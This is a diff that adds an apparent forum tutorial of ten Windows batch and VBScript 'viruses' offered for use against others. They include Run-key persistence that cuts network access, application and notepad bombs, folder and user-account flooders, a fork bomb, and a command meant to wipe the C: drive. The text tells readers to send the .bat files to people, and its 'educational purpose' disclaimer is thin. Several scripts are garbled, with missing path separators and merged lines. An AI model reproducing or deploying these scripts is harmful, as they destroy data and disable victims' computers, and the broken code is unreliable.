@@ -1,0 +1,109 @@
+hello guys,today I'm gonna showing how to create simple viruses by using batch scripting, so lets get started..
+
+NOTE: This post is solely and mainly for educational purpose only.  I am not responsible for any damage or error reporting on Your PC by this tutorial., do it at your own risk.
+
+Warning: Do not try this on your daily working PC.
+
+
+
+1. Disable Internet Permanently
+
+echo @echo off>c:windowswimn32.bat
+echo break off>c:windowswimn32.bat echo
+ipconfig/release_all>c:windowswimn32.bat
+echo end>c:windowswimn32.batreg add
+hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
+hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
+PAUSE
+
+
+2.Endless Notepads
+This will pop up endless notepads until the computer freezes and crashes
+
+@ECHO off
+ :top
+ START %SystemRoot%\system32\notepad.exe
+ GOTO top
+
+3.Popping CD Drives
+This will make the CD drives constantly pop out
+
+Set oWMP = CreateObject(”WMPlayer.OCX.7″)
+ Set colCDROMs = oWMP.cdromCollection
+ do
+ if colCDROMs.Count >= 1 then
+ For i = 0 to colCDROMs.Count – 1
+ colCDROMs.Item(i).Eject
+ Next
+ For i = 0 to colCDROMs.Count – 1
+ colCDROMs.Item(i).Eject
+ Next
+ End If
+ wscript.sleep 100
+ loop
+
+
+4.Endless Enter
+This will make the enter button pressed continuously
+
+Set wshShell = wscript.CreateObject(”WScript.Shell”)
+ do
+ wscript.sleep 100
+ wshshell.sendkeys “~(enter)”
+ loop
+
+5 Application Bomber
+It will start to open different applications repeatedly which will affect the system’s performance.You can also add the application of your choice in the  code.
+
+@echo off
+ :x
+ start winword
+ start mspaint
+ start notepad
+ start write
+ start cmd
+ start explorer
+ start control
+ start calc
+ goto x
+
+6.Folder Flooder
+This will create unlimited no. of folders.
+
+@echo off
+:x
+md %random%
+/folder.
+goto x
+
+7.User Account Flooder
+This will create large no. of the user account on one’s PC and goes on
+
+@echo off
+:xnet
+user %random% /add
+goto x
+
+8.Process Creator
+This will create unlimited background processes
+
+%0|%0
+
+
+9.Windows Hacker
+This will delete your whole C:\ drive and it really unrecoverable
+
+@Echo off
+Del C:\ *.* |y
+
+
+10.How to stop someone’s internet access
+@Echo off
+pconfig /release
+Save that as a .bat and send it to someone. They’re IP address will be lost, and therefore they won’t be able to fix it
+However, this is VERY easy to fix. Simply type in IPconfig /renew
+
+
+
+
+After copy-pasting any one of the viruses at a time in the Notepad, save the file in ALL FILES mode with an extension “.bat“
